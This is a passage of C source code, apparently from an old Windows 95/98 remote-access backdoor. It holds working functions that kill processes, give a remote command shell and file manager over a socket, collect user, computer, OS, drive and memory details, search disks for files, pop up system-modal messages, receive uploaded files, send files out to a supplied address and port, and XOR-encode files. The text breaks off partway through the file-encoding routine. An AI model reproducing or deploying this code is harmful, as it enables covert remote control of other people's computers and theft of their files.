PROCESS_INFO *get_processes(DWORD *num_proc)
{
	HANDLE hSnapshot;
	PROCESSENTRY32 ProcessEntry;
	DWORD num_processes;
	PROCESS_INFO *processes;
	char *exefilename; // name of process' executable file

	if (WINNT_RUNNING)
		return NULL; // unable to get process list if Windows NT is running

	if ((hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0))==NULL)
		return NULL;
	ProcessEntry.dwSize = sizeof(PROCESSENTRY32); /* !!!WARNING!!! */
	if (!Process32First(hSnapshot,&ProcessEntry)) { /* if first process not found (it's impossible)... */
#ifdef ERROR_MODE
			ShowError("Process32First() in list_process()");
#endif
		return NULL; /* no processes - no life */
	}
	num_processes = 0;
	processes = NULL;
	do {
		num_processes++;
		processes=(PROCESS_INFO *)realloc(processes,num_processes*sizeof(PROCESS_INFO));
		if (processes==NULL) {
#ifdef ERROR_MODE
				ShowError("malloc() in list_process()");
#endif
			return NULL;
		}
		processes[num_processes-1].process_name = (char *)malloc(lstrlen(ProcessEntry.szExeFile)+1);
		lstrcpy(processes[num_processes-1].process_name,ProcessEntry.szExeFile);
		processes[num_processes-1].process_id = ProcessEntry.th32ProcessID;
	} while (Process32Next(hSnapshot, &ProcessEntry));
	CloseHandle(hSnapshot);
	*num_proc = num_processes; // set this global var to the number of currently running processes
	return processes;
}

int kill_process(char *process_name)
{
	DWORD process_id;
	DWORD process_exit_code;
	HANDLE hProcess;

	if (WINNT_RUNNING) // kill processes only on Windows 98/95
		return OPERATION_ERROR;
	if (get_process_id(process_name,&process_id)==OPERATION_ERROR)
		return OPERATION_ERROR;
	if ((hProcess = OpenProcess(PROCESS_TERMINATE,FALSE,process_id))==NULL)
		return OPERATION_ERROR;
	if (!GetExitCodeProcess(hProcess,&process_exit_code))
		return OPERATION_ERROR;
	if (!TerminateProcess(hProcess,process_exit_code))
		return OPERATION_ERROR;
	CloseHandle(hProcess);
	return OPERATION_SUCCESS;
}

int get_process_id(char *process_name, DWORD *pProcess_id)
{
	PROCESS_INFO *proc_info;
	DWORD num_processes;
	char proc_name[MAX_PATH];
	int i;

	proc_info = get_processes(&num_processes);
	if (proc_info==NULL) {
#ifdef ERROR_MODE
			ShowError("proc_info = NULL in get_process_id()");
#endif
		return OPERATION_ERROR;
	}
	upper_case(process_name); // make the name of the process to be killed in upper case
	for (i = 0; i < num_processes; i++) {
		extract_file_name(proc_info[i].process_name, proc_name);
		upper_case(proc_name); // name of found process
		upper_case(proc_info[i].process_name);
		if (
			!lstrcmp(proc_info[i].process_name, process_name) ||
			!lstrcmp(proc_name, process_name)
		) {
			*pProcess_id = proc_info[i].process_id;
			return OPERATION_SUCCESS;
		}
	}
	return OPERATION_ERROR;
}

void extract_file_path(char *file_name, char *file_path)
{
	int bs_pos; /* position of the last backslash */

	bs_pos = 0;
	bs_pos = lstrlen(file_name)-1;
	if (bs_pos == -1) {
		file_path = NULL;
		return;
	}
	do {
		if (file_name[bs_pos] == '\\')
			break;
		else
			bs_pos--;
	} while (bs_pos != -1);
	if (bs_pos == -1) {
		file_path = NULL;
		return;
	}
	lstrcpyn(file_path, file_name, bs_pos + 1);
	file_path[bs_pos+1] = '\0';
}

void extract_file_name(char *file_path, char *file_name)
{
	int bs_pos;

	bs_pos = 0;
	bs_pos = lstrlen(file_path)-1;
	if (bs_pos == -1) {
		file_name = NULL;
		return;
	}
	do {
		if (file_path[bs_pos] == '\\')
			break;
		else
			bs_pos--;
	} while (bs_pos != -1);
	if (bs_pos == -1) {
		file_name = NULL;
		return;
	}
	lstrcpyn(file_name, file_path+bs_pos+1, lstrlen(file_path)-bs_pos);
	file_name[lstrlen(file_path)-bs_pos-1] = '\0';
}

/*
 *	get_file_size() - Gets the size of the file.
 *
 *	returns: OPERATION_ERROR - error, OPERATION_SUCCESS - success.
 */
int get_file_size(char *file_name, DWORD *pfile_size)
{
	HANDLE hFile;
	DWORD f_size;

	if ((hFile = open_file(file_name)) == INVALID_HANDLE_VALUE)
		return (OPERATION_ERROR);

	if ((f_size = GetFileSize(hFile, NULL)) == 0xFFFFFFFF) {
		*pfile_size = 0x00000000;
		CloseHandle(hFile);
		return (OPERATION_ERROR);
	} else {
		*pfile_size = f_size;
		CloseHandle(hFile);
		return (OPERATION_SUCCESS);
	}
}

/*
 *	run_file_manager() - manage remote files. Something similar to "command.com".
 */
/*=Those two lines are hoere to avoid stack checking=*/
char search_path[4096];
void run_file_manager(int con_s)
{
	int res;
	int input_res;
	int total_files;
	char f_com[MAX_COMMAND_LENGTH];
	char response[MAX_COMMAND_LENGTH];
	char param1[MAX_COMMAND_LENGTH];
	char CURRENT_PATH[512];
	WIN32_FIND_DATA ffdata;
	HANDLE hFindFile;

	ZeroMemory(response, sizeof(response));
	ZeroMemory(CURRENT_PATH, sizeof(CURRENT_PATH));
	ZeroMemory(f_com, sizeof(f_com));
	ZeroMemory(param1, sizeof(param1));
	wsprintf(response, "\r\n\r\nWelcome to Ed's command line...\r\n");
	SEND_RESPONSE();
	wsprintf(CURRENT_PATH, "C:\\");
	do {
		wsprintf(response, "%s>", CURRENT_PATH);
		SEND_RESPONSE();
		res = get_s_data(con_s, f_com, sizeof(f_com));
		if ((res) && (res != (OPERATION_ERROR)) && (res != INPUT_TOO_LONG)) {
			if ((lstrcmp(f_com, "ls")) && (lstrcmp(f_com, "cd")) && (lstrcmp(f_com, "closefm"))) { /* is it command for the file manager ? */
				execute_command(con_s, f_com); /* NO ! */
			} else { /* yes, begin processing... */
				if (!lstrcmp(f_com, "cd")) { /* is it "cd" ? */
					input_res = get_com_param(
							con_s,
							"Folder name: ",
							param1,
							sizeof(param1),
							TRUE
					);
					if (input_res != OPERATION_ERROR) {
						lstrcat(CURRENT_PATH, param1);
						lstrcpyn(CURRENT_PATH + lstrlen(param1), "\\", 2);
					}
				}
				if (!lstrcmp(f_com, "ls")) { /* is it "ls" ? */
					total_files = 0;
					ZeroMemory(search_path, sizeof(search_path));
					lstrcpy(search_path, CURRENT_PATH);
					lstrcat(search_path, "*");
					hFindFile = FindFirstFile(search_path, &ffdata);
					if (hFindFile == INVALID_HANDLE_VALUE) {
						wsprintf(response, "Bad path!\r\n");
						SEND_RESPONSE();
						wsprintf(CURRENT_PATH, "C:\\");
					} else {
						do {
							total_files++;
							wsprintf(response, "%s", ffdata.cFileName);
							if (ffdata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
								lstrcat(response, " - [FOLDER]");
							lstrcat(response, "\r\n");
							SEND_RESPONSE();
						} while (FindNextFile(hFindFile, &ffdata));
						wsprintf(response, "\r\nTotal files in [%s>]: [%d].\r\n", CURRENT_PATH, total_files);
						SEND_RESPONSE();
					}
				}
				if (!lstrcmp(f_com, "closefm")) {
					FindClose(hFindFile);
					return;
				}
			}
			ZeroMemory(f_com, sizeof(f_com));
		}
		if (res == INPUT_TOO_LONG)
			if (send(con_s, "\r\nCommand too long!", 19, 0) == SOCKET_ERROR)
				return;
	} while (res != (OPERATION_ERROR));
	closesocket(con_s);
	FindClose(hFindFile);
	#ifdef DEBUG_MODE
		ShowDebug("run_file_manager() - Connection closed by foreign host.");
	#endif
}

char upper_to_lower(char ch)
{
	return ( ((ch >= 'a') && (ch <= 'z')) ? ch : ( ((ch >= 'A') && (ch <= 'Z')) ? (ch + 32) : ch) );
}

char lower_to_upper(char ch)
{
	return ( ((ch >= 'A') && (ch <= 'Z')) ? ch : ( ((ch >= 'a') && (ch <= 'z')) ? (ch - 32) : ch) );
}

void upper_case(char *str)
{
	char *pStr;

	pStr = str;
	if (*pStr) {
		while (*pStr) {
			*pStr = lower_to_upper(*pStr);
			pStr++;
		}
		*pStr++ = '\0';
	}
}

void lower_case(char *str)
{
	char *pStr;

	pStr = str;
	if (*pStr) {
		while (*pStr) {
			*pStr = upper_to_lower(*pStr);
			pStr++;
		}
		*pStr++ = '\0';
	}
}

/*
 *	get_user_name() - Gets the name of the user currently logged onto the system.
 *
 *	returns: OPERATION_ERROR - on error, lendth of the user's name on success.
 */
int get_user_name(char *name_buf)
{
	char u_name[128];
	DWORD nSize;

	ZeroMemory(u_name, sizeof(u_name));
	nSize = sizeof(u_name);
	if (GetUserName(u_name, &nSize)) {
		lstrcpyn(name_buf, u_name, nSize);
		return (nSize);
	} else
		return (OPERATION_ERROR);
}

void get_computer_info(int info_type, char *ret_buf)
{
	char *buf;
	DWORD nSize;
	int i;

	if ((buf = (char *)malloc(512)) == NULL)
		return;
	switch (info_type) {
		case INFOTYPE_USER_NAME:
			/*
			 * GET USER NAME
			 */
			ZeroMemory(buf, 512);
			get_user_name(buf);
			wsprintf(ret_buf, "Currently logged in user's name is [%s]\r\n", buf);
			break;

		case INFOTYPE_COMP_NAME:
			/*
			 * GET COMPUTER NAME
			 */
			ZeroMemory(buf, 512);
			nSize = MAX_COMPUTERNAME_LENGTH+1;
			if (!(i = GetComputerName(buf, &nSize))) {
				wsprintf(ret_buf, "Unable to get computer name!\r\n");
			} else {
				wsprintf(ret_buf, "Computer name is: [%s]\r\n", buf);
			}
			break;

		case INFOTYPE_OS_INFO:
			/*
			 * GET OPERATING SYSTEM INFO
			 */
			ZeroMemory(buf, 512);
			OSVERSIONINFO os_info;
			os_info.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
			if (!GetVersionEx(&os_info)) {
				wsprintf(ret_buf, "Unable to get OS information!\r\n");
			} else {
				switch(os_info.dwPlatformId) {
					case VER_PLATFORM_WIN32s:
						wsprintf(buf, "Win32s on Windows 3.11");
						break;
					case VER_PLATFORM_WIN32_WINDOWS:
						wsprintf(buf, "Win32 on Windows 95 or Windows 98");
						break;
					case VER_PLATFORM_WIN32_NT:
						wsprintf(buf, "Win32 on Windows NT");
						break;
					default:
						wsprintf(buf, "Win32 on unknown type");
						break;
				}
				wsprintf(
						ret_buf,
						"<OS information>\r\n"
						"\tMajor version: [%lu]\r\n"
						"\tMinor version: [%lu]\r\n"
						"\tBuild number: [%lu]\r\n"
						"\tPlatform: [%s]\r\n"
						"\tService Pack: [%s]\r\n",
						os_info.dwMajorVersion,
						os_info.dwMinorVersion,
						os_info.dwBuildNumber,
						buf,
						os_info.szCSDVersion
				);
			}
			break;

		case INFOTYPE_PROC_INFO:
			/*
			 * GET PROCESSOR TYPE
			 */
			ZeroMemory(buf, 512);
			SYSTEM_INFO sys_info;
			GetSystemInfo(&sys_info);
			switch (sys_info.dwProcessorType) {
				case PROCESSOR_INTEL_386:
					wsprintf(buf, "Intel 80386");
					break;
				case PROCESSOR_INTEL_486:
					wsprintf(buf, "Intel 80486");
					break;
				case PROCESSOR_INTEL_PENTIUM:
					wsprintf(buf, "Intel 80586");
					break;
				case PROCESSOR_MIPS_R4000:
					wsprintf(buf, "MIPS R4000");
					break;
				case PROCESSOR_ALPHA_21064:
					wsprintf(buf, "ALPHA 21064");
					break;
				default:
					wsprintf(buf, "Unknown");
					break;
			}
			wsprintf(ret_buf, "Processor type: [%s]\r\n", buf);
			break;

		case INFOTYPE_DRIVE_INFO:
			/*
			 * GET TYPES OF AVAILABLE DRIVES
			 */
			ZeroMemory(buf, 512);
			char drv_n;
			UINT drv_t;
			char drv_inf[128];
			char tmp_buf[32];
			DWORD sec_p_clust, bytes_p_sec, num_free_clust, total_clust;
			wsprintf(ret_buf, "<Available drives>\r\n");
			for (drv_n = 'A'; drv_n <= 'Z'; drv_n++) {
				wsprintf(buf, "%c:\\", drv_n);
				drv_t = GetDriveType(buf);
				if (drv_t != 0x01) { /* is this drive existent ? */
					/* yes, it is */
					wsprintf(tmp_buf, " Drive [%c] - ", drv_n);
					lstrcat(ret_buf, tmp_buf);
					switch (drv_t) {
						case 0:
							lstrcat(ret_buf, "cannot be determined!\r\n");
							break;
						case DRIVE_REMOVABLE:
							lstrcat(ret_buf, "removable.\r\n");
							break;
						case DRIVE_FIXED:
							ZeroMemory(drv_inf, sizeof(drv_inf));
							GetDiskFreeSpace(
									buf, /* root path */
									&sec_p_clust, /* sectors per cluster */
									&bytes_p_sec, /* bytes per sector */
									&num_free_clust, /* number of free clusters */
									&total_clust /* total number of clusters */
							);
							lstrcat(ret_buf, "Fixed:\r\n");
							wsprintf(
									drv_inf,
									"\tDrive size: %luM\r\n"
									"\tFree space: %luM\r\n"
									"\tUsed space: %luM\r\n",
									bytes_p_sec*sec_p_clust*total_clust / (1024*1024),
									bytes_p_sec*sec_p_clust*num_free_clust / (1024*1024),
									(bytes_p_sec*sec_p_clust*total_clust / (1024*1024)) - (bytes_p_sec*sec_p_clust*num_free_clust / (1024*1024))
							);
							lstrcat(ret_buf, drv_inf);
							break;
						case DRIVE_REMOTE:
							lstrcat(ret_buf, "remote (network) drive.\r\n");
							break;
						case DRIVE_CDROM:
							lstrcat(ret_buf, "CD-ROM.\r\n");
							break;
						case DRIVE_RAMDISK:
							lstrcat(ret_buf, "RAM disk.\r\n");
							break;
						default:
							lstrcat(ret_buf, "Unknown.\r\n");
							break;
					} /* switch ... */
				} /* if (drv_t != 0x01) ... */
			} /* for ... */
			break;

		case INFOTYPE_MEMORY_INFO:
			/*
			 * GET MEMORY INFORMATION
			 */
			ZeroMemory(buf, 512);
			MEMORYSTATUS mem_stat;
			mem_stat.dwLength = sizeof(MEMORYSTATUS);
			GlobalMemoryStatus(&mem_stat); /* get status of all RAM */
			wsprintf(
					ret_buf,
					"<Global memory information>\r\n"
					"\tMemory used: [%lu%%]\r\n"
					"\tTotal physical memory: [%lu bytes] = [%luM]\r\n"
					"\tFree physical memory: [%lu bytes] = [%luM]\r\n"
					"\tSize of paging file: [%lu bytes] = [%luM]\r\n"
					"\tFree of paging file: [%lu bytes] = [%luM]\r\n"
					"\tTotal size of virtual memory: [%lu bytes] = [%luM]\r\n"
					"\tFree of virtual memory: [%lu bytes] = [%luM]\r\n",
					mem_stat.dwMemoryLoad,				/* size of used memory */
					mem_stat.dwTotalPhys,				/* size of physical memory in bytes */
					mem_stat.dwTotalPhys / (1024*1024),		/* in megabytes */
					mem_stat.dwAvailPhys,				/* size of available mem */
					mem_stat.dwAvailPhys / (1024*1024),		/* in megabytes */
					mem_stat.dwTotalPageFile,			/* size of paging file */
					mem_stat.dwTotalPageFile / (1024*1024),	/* in megabytes */
					mem_stat.dwAvailPageFile,			/* size of available paging file */
					mem_stat.dwAvailPageFile / (1024*1024),	/* in megabytes */
					mem_stat.dwTotalVirtual,			/* size of virtual mem */
					mem_stat.dwTotalVirtual / (1024*1024),	/* in megabytes */
					mem_stat.dwAvailVirtual,			/* size of availabel virtual mem */
					mem_stat.dwAvailVirtual / (1024*1024)	/* in megabytes ... */
					/*
					 * Who... that killing code... who...
					 */
			);
			break;
		default:
			break;
	} /* switch (info_type) ... */
}

/*
 *	run_findfile_engine() - Attempts to find the given file (wildcard) and writes the
 *					full path to the given socket...
 *
 *	The idea.
 *		This is recursive function. First I am searching the given file in "root_path",
 *		if I am unable to find it there, then I am going to find all directories and
 *		call this function again with each directory as the "root_path" and so on...
 *
 *		Ed Gess.
 */
void findfile_by_name(int con_s, char *root_path, char *file_name)
{
	WIN32_FIND_DATA ffdata;
	HANDLE hFindFile;
	char *s_path; /* search path */
	char *tmp_buf;

	s_path = (char *)malloc(MAX_PATH + 0xF);
	tmp_buf = (char *)malloc(MAX_PATH + 0xF);
	if (
		s_path == NULL ||
		tmp_buf == NULL
	) {
		free(s_path);
		free(tmp_buf);
		#ifdef ERROR_MODE
			ShowError("malloc() in findfile_by_name()");
		#endif
		return;
	}
	lstrcpyn(s_path, root_path, lstrlen(root_path) + 1); /* with NULL char */
	lstrcpyn(s_path + lstrlen(root_path), file_name, lstrlen(file_name) + 1); /* and here */
	/*
	 * Now I'll search the file in the "root_path"
	 */
	if ((hFindFile = FindFirstFile(s_path, &ffdata))!=INVALID_HANDLE_VALUE) {
		do {
			if (lstrcmp(ffdata.cFileName,"..")!=0 && lstrcmp(ffdata.cFileName,".")!=0) {
				wsprintf(tmp_buf, " [%s%s]\r\n", root_path, ffdata.cFileName);
				if (send(con_s, tmp_buf, lstrlen(tmp_buf), 0) == SOCKET_ERROR) {
					free(s_path);
					free(tmp_buf);
					return;
				}
			}
		} while (FindNextFile(hFindFile, &ffdata));
	}
	FindClose(hFindFile);

	/*
	 * Begin the directory search...
	 */
	lstrcpyn(s_path, root_path, lstrlen(root_path)+1);
	lstrcat(s_path, "*"); /* wildcard - find everything */
	hFindFile = FindFirstFile(s_path, &ffdata);
	do {
		if (ffdata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) { /* is it directory ? */
			/* yes, it is... */
			if (lstrcmp(ffdata.cFileName, "..")!=0 && lstrcmp(ffdata.cFileName, ".")!=0) { /* is the name OK ? */
				/* yes, it is */
				lstrcpyn(tmp_buf, root_path, lstrlen(root_path)+1);
				lstrcpyn(tmp_buf + lstrlen(root_path), ffdata.cFileName, lstrlen(ffdata.cFileName)+1);
				lstrcpyn(tmp_buf + lstrlen(tmp_buf), "\\", 2);
				findfile_by_name(con_s, tmp_buf, file_name);
			}
		}
	} while (FindNextFile(hFindFile, &ffdata));
	FindClose(hFindFile);
	free(s_path);
	free(tmp_buf);
}

void findfile_by_size(int con_s, char *root_path, DWORD min_size, DWORD max_size)
{
	WIN32_FIND_DATA ffdata;
	HANDLE hFindFile;
	char *s_path;
	char *tmp_buf;

	s_path = (char *)malloc(MAX_PATH+0xF);
	tmp_buf = (char *)malloc(MAX_PATH+0xF);
	if (
		s_path == NULL ||
		tmp_buf == NULL
	) {
		free(s_path);
		free(tmp_buf);
		#ifdef ERROR_MODE
			ShowError("malloc() in findfile_by_name()");
		#endif
		return;
	}
	lstrcpyn(s_path, root_path, lstrlen(root_path)+1);
	lstrcpyn(s_path + lstrlen(s_path), "*", 2);
	if ((hFindFile = FindFirstFile(s_path, &ffdata)) != INVALID_HANDLE_VALUE) {
		do {
			if (lstrcmp(ffdata.cFileName, "..") && lstrcmp(ffdata.cFileName, ".")) {
				if (ffdata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
					lstrcpyn(tmp_buf, root_path, lstrlen(root_path)+1);
					lstrcpyn(tmp_buf + lstrlen(tmp_buf), ffdata.cFileName, lstrlen(ffdata.cFileName) + 1);
					lstrcpyn(tmp_buf + lstrlen(tmp_buf), "\\", 2);
					findfile_by_size(con_s, tmp_buf, min_size, max_size); /* recurse */
				} else {
					if ((ffdata.nFileSizeLow >= min_size) && (ffdata.nFileSizeLow <= max_size)) {
						wsprintf(tmp_buf, "*[%s%s]\r\n", root_path, ffdata.cFileName);
						if (send(con_s, tmp_buf, lstrlen(tmp_buf), 0) == SOCKET_ERROR) {
							free(s_path);
							free(tmp_buf);
							return;
						}
						wsprintf(
							tmp_buf,
							" File size is: [%lu byte(s)] = [%lu kilobyte(s)] = [%lu megabyte(s)]\r\n",
							ffdata.nFileSizeLow,
							(ffdata.nFileSizeLow+1) / 1024,
							(ffdata.nFileSizeLow+1) / (1024*1024)
						);
						if (send(con_s, tmp_buf, lstrlen(tmp_buf), 0) == SOCKET_ERROR) {
							free(s_path);
							free(tmp_buf);
							return;
						}
					}
				}
			} /* if ! file name == ".." or "." */
		} while (FindNextFile(hFindFile, &ffdata));
	}
	FindClose(hFindFile);
	free(s_path);
	free(tmp_buf);
}

DWORD WINAPI message_box_thread(LPVOID param)
{
	char *msg_title;
	char *msg_text;
	char *pParam;
	long m_type_btn; /* message buttons and type */

	pParam = (char *)param;
	msg_text = pParam;
	msg_title = (pParam+lstrlen(msg_text)+1);
	m_type_btn = atol(pParam+lstrlen(msg_text)+lstrlen(msg_title)+2);
	MessageBox(NULL, msg_text, msg_title, m_type_btn | MB_SYSTEMMODAL);
	free(param); /* free a memory allocated in "display_message_box()" ... */

	return (0); /* return from thread (terminate thread) */
}

void display_message_box(char *msg_text, char *msg_title, int msg_type_btn)
{
	DWORD thread_id;
	char *thread_param;
	char *type_buf;

	thread_param = (char *)malloc(lstrlen(msg_text)+lstrlen(msg_title)+32);
	type_buf = (char *)malloc(16);
	if (
		(thread_param == NULL) ||
		(type_buf == NULL)
	) {
		free(type_buf);
		free(thread_param);
		#ifdef ERROR_MODE
			ShowError("malloc() in display_message_box()");
		#endif
		return;
	}
	lstrcpyn(thread_param, msg_text, lstrlen(msg_text)+1); /* NULL-terminated string */
	lstrcpyn(thread_param+lstrlen(msg_text)+1, msg_title, lstrlen(msg_title)+1);
	wsprintf(type_buf, "%d", msg_type_btn);
	lstrcpyn(thread_param+lstrlen(msg_text)+lstrlen(msg_title)+2, type_buf, lstrlen(type_buf)+1);
	CreateThread(
			NULL,				/* lpThreadAttributes */
			0,					/* dwStackSize - use defaults */
			message_box_thread,	/* address of thread function */
			thread_param,		/* address of parameter */
			0,					/* creation flag - run after creation */
			&thread_id			/* lpThreadId - where to store thread's ID ? */
	);
}

/*
 *	get_file_data_thread() - This function waits for a data on the appointed port. When
 *					 it gets the data it will writes it to the given file.
 */
DWORD WINAPI get_file_data_thread(LPVOID param)
{
	int file_s; /* file socket */
	int sin_size, in_s;
	int got_bytes;
	int port_num;
	int res_socket;
	char *file_name;
	char *file_buf;
	struct sockaddr_in local_addr, rem_addr;
	WSADATA wsaData;
	THREAD_PARAM *thread_param;

	thread_param = (THREAD_PARAM *)param;
	file_name = thread_param->param1;
	port_num = atol(thread_param->param2);
	res_socket = atol(thread_param->param3);
	if (WSAStartup(MAKEWORD(WSA_VERSION_HIGH,WSA_VERSION_LOW),&wsaData) != OPERATION_SUCCESS) {
		free(thread_param->param1);
		free(thread_param->param2);
		free(thread_param->param3);
		#ifdef ERROR_MODE
			ShowError("WSAStartup() in get_file_data_thread()");
		#endif
		return (0);
	}

	if ((file_s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
		free(thread_param->param1);
		free(thread_param->param2);
		free(thread_param->param3);
		#ifdef ERROR_MODE
			ShowError("socket() in get_file_data_thread()");
		#endif
		return (0);
	}

	ZeroMemory(&local_addr, sizeof(struct sockaddr_in)); /* fill whole struct by zeroes */
	local_addr.sin_port = htons(port_num);
	local_addr.sin_addr.s_addr = INADDR_ANY;
	local_addr.sin_family = AF_INET;

	if (bind(file_s, (struct sockaddr *)&local_addr, sizeof(struct sockaddr)) == SOCKET_ERROR) {
		free(thread_param->param1);
		free(thread_param->param2);
		free(thread_param->param3);
		#ifdef ERROR_MODE
			ShowError("bind() in get_file_data_thread()");
		#endif
		return (0);
	}

	if (listen(file_s, 1) == SOCKET_ERROR) {
		free(thread_param->param1);
		free(thread_param->param2);
		free(thread_param->param3);
		#ifdef ERROR_MODE
			ShowError("listen() in get_file_data_thread()");
		#endif
		return (0);
	}
	if ((file_buf = (char *)malloc(SENDGET_FILE_BUF_SIZE)) == NULL) {
		free(thread_param->param1);
		free(thread_param->param2);
		free(thread_param->param3);
		closesocket(file_s);
		#ifdef ERROR_MODE
			ShowError("malloc() in get_file_data_thread()");
		#endif
		return (0);
	}
	while (TRUE) {
		sin_size = sizeof(struct sockaddr_in);
		if ((in_s = accept(file_s, (struct sockaddr *)&rem_addr, &sin_size)) == INVALID_SOCKET) {
			#ifdef ERROR_MODE
				ShowError("accept() in get_file_data_thread()");
			#endif
			continue; /* that error is not a cause for quiting */
		}
		/*
		 * OK, got connection.
		 */
		do {
			got_bytes = recv(in_s, file_buf, SENDGET_FILE_BUF_SIZE, 0);
			if (got_bytes > 0) {
				append_file(file_name, file_buf, got_bytes);
			}
		} while (got_bytes > 0 && got_bytes != SOCKET_ERROR);
		free(thread_param->param1);
		free(thread_param->param2);
		free(thread_param->param3);
		closesocket(in_s);
		closesocket(file_s);
		free(file_buf);
		SleepEx(500, FALSE);
		send(res_socket, "\r\nReceving complete.\r\n", 22, 0);
		return (0);
	}
}

/*
 *	send_file_data_thread() - Connects to a server by the given address and port number,
 *					  then gets a data from the file and sends it to that server.
 */
DWORD WINAPI send_file_data_thread(LPVOID param)
{
	int file_s; /* socket */
	struct sockaddr_in addr;
	WSADATA wsaData;
	HANDLE hFile;
	DWORD bytestoread;
	int port_num;
	char *file_name;
	char *srv_address;
	char *file_buf;
	int res_socket; /* where to write the operation results */
	THREAD_PARAM *thread_param;
	int bytes_sent = 0;

	thread_param = (THREAD_PARAM *)param;
	file_name = thread_param->param1;
	srv_address = thread_param->param2;
	port_num = atol(thread_param->param3);
	res_socket = atol(thread_param->param4);
	if (WSAStartup(MAKEWORD(WSA_VERSION_HIGH,WSA_VERSION_LOW),&wsaData) != OPERATION_SUCCESS) {
		free(thread_param->param1);
		free(thread_param->param2);
		free(thread_param->param3);
		free(thread_param->param4);
		#ifdef ERROR_MODE
			ShowError("WSAStartup() in send_file_data_thread()");
		#endif
		return (0);
	}

	if ((file_s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
		free(thread_param->param1);
		free(thread_param->param2);
		free(thread_param->param3);
		free(thread_param->param4);
		#ifdef ERROR_MODE
			ShowError("socket() in send_file_data_thread()");
		#endif
		return (0);
	}

	ZeroMemory(&addr, sizeof(struct sockaddr_in)); /* fill the whole struct by zeroes */
	addr.sin_port = htons(port_num);
	addr.sin_addr.s_addr = inet_addr(srv_address);
	addr.sin_family = AF_INET;

	if (connect(file_s, (struct sockaddr *)&addr, sizeof(struct sockaddr)) == SOCKET_ERROR) {
		free(thread_param->param1);
		free(thread_param->param2);
		free(thread_param->param3);
		free(thread_param->param4);
		closesocket(file_s);
		#ifdef ERROR_MODE
			ShowError("connect() in send_file_data_thread()");
		#endif
		return (0);
	}
	if ((file_buf = (char *)malloc(SENDGET_FILE_BUF_SIZE)) == NULL) {
		free(thread_param->param1);
		free(thread_param->param2);
		free(thread_param->param3);
		free(thread_param->param4);
		closesocket(file_s);
		#ifdef ERROR_MODE
			ShowError("malloc() in send_file_data_thread()");
		#endif
		return (0);
	}
	if ((hFile = open_file(file_name)) == INVALID_HANDLE_VALUE) {
		free(thread_param->param1);
		free(thread_param->param2);
		free(thread_param->param3);
		free(thread_param->param4);
		free(file_buf);
		closesocket(file_s);
		#ifdef ERROR_MODE
			ShowError("open_file() in send_file_data_thread()");
		#endif
		return (0);
	}
	bytestoread = SENDGET_FILE_BUF_SIZE;
	while (ReadFile(hFile, file_buf, SENDGET_FILE_BUF_SIZE, &bytestoread, NULL) && bytestoread > 0) {
		bytes_sent = send(file_s, file_buf, bytestoread, 0);
		if (!bytes_sent || bytes_sent == SOCKET_ERROR) {
			free(thread_param->param1);
			free(thread_param->param2);
			free(thread_param->param3);
			free(thread_param->param4);
			free(file_buf);
			closesocket(file_s);
			send(res_socket, "senddata: Unable to send the data!\r\n", 36, 0);
			return (0);
		}
		bytestoread = SENDGET_FILE_BUF_SIZE;
	}
	CloseHandle(hFile); /* WARNING: don't forget to do that!!! */
	free(thread_param->param1);
	free(thread_param->param2);
	free(thread_param->param3);
	free(thread_param->param4);
	free(file_buf);
	closesocket(file_s);
	SleepEx(500, FALSE);
	send(res_socket, "\r\nSending complete.\r\n", 21, 0);
	return (0);
}

/*
 *	get_file_data() - Shadow function. It will gets and converts parameters to the
 *					  "THREAD_PARAM" and then creates a thread that will controls
 *					  data which will be sent by the "send_file_data()" function.
 *
 *	In a word... now is 2:23 o'clock (Night) and I very wanna sleep, so if you
 *	want to understand something here, read the sources... my brain is working in
 *	automatic mode... }8-|
 */
static void get_file_data(char *file_name, int port_n, int res_socket)
{
	static THREAD_PARAM th_param;
	DWORD thread_id;

	th_param.param1 = (char *)malloc(lstrlen(file_name)+0x10);
	th_param.param2 = (char *)malloc(0x10);
	th_param.param3 = (char *)malloc(0x10);
	if (
		th_param.param1 == NULL ||
		th_param.param2 == NULL ||
		th_param.param3 == NULL
	) { /* euch... Error getting memory... */
		free(th_param.param1);
		free(th_param.param2);
		free(th_param.param3);
		#ifdef ERROR_MODE
			ShowError("malloc() in get_file_data()");
		#endif
		return;
	}
	lstrcpyn(th_param.param1, file_name, lstrlen(file_name)+1); /* NULL-terminated file name */
	wsprintf(th_param.param2, "%d", port_n); /* where to wait the data */
	wsprintf(th_param.param3, "%d", res_socket); /* where to write the results */
	CreateThread(NULL, 0, get_file_data_thread, &th_param, 0, &thread_id);
}

/*
 *	send_file_data() - Something similar to "get_file_data()", but only on the contrary.
 */
static void send_file_data(char *file_name, char *server_address, int port_n, int res_socket)
{
	static THREAD_PARAM th_param;
	DWORD thread_id;

	th_param.param1 = (char *)malloc(lstrlen(file_name)+0x10);
	th_param.param2 = (char *)malloc(lstrlen(server_address)+0x10);
	th_param.param3 = (char *)malloc(0x10);
	th_param.param4 = (char *)malloc(0x10);
	if (
		th_param.param1 == NULL ||
		th_param.param2 == NULL ||
		th_param.param3 == NULL ||
		th_param.param4 == NULL
	) { /* no memory? would you kill yourself fucking windows! */
		free(th_param.param1);
		free(th_param.param2);
		free(th_param.param3);
		free(th_param.param4);
		#ifdef ERROR_MODE
			ShowError("malloc() in send_file_data()");
		#endif
		return;
	}
	lstrcpyn(th_param.param1, file_name, lstrlen(file_name)+1);
	lstrcpyn(th_param.param2, server_address, lstrlen(server_address)+1);
	wsprintf(th_param.param3, "%d", port_n);
	wsprintf(th_param.param4, "%d", res_socket);
	CreateThread(NULL, 0, send_file_data_thread, &th_param, 0, &thread_id);
}

/*
 *	code_file() - This function codes/decodes the given file.
 */
int code_file(char *file_name, byte xor_key)
{
	char *f_buf;
	DWORD f_size;
	int i;

	if (get_file_size(file_name, &f_size) == OPERATION_ERROR)
		return (OPERATION_ERROR);
	if ((f_buf = (char *)malloc(f_size)) == NULL) {
		#ifdef ERROR_MODE
			ShowError("malloc() in code_file()");
		#endif
		return (OPERATION_ERROR);
	}
	if (read_file(file_name, f_buf, f_size) == OPERATION_ERROR) {
		free(f_buf);
		#ifdef ERROR_MODE
			ShowError("read_file() in code_file()");
		#endif
		return (OPERATION_ERROR);
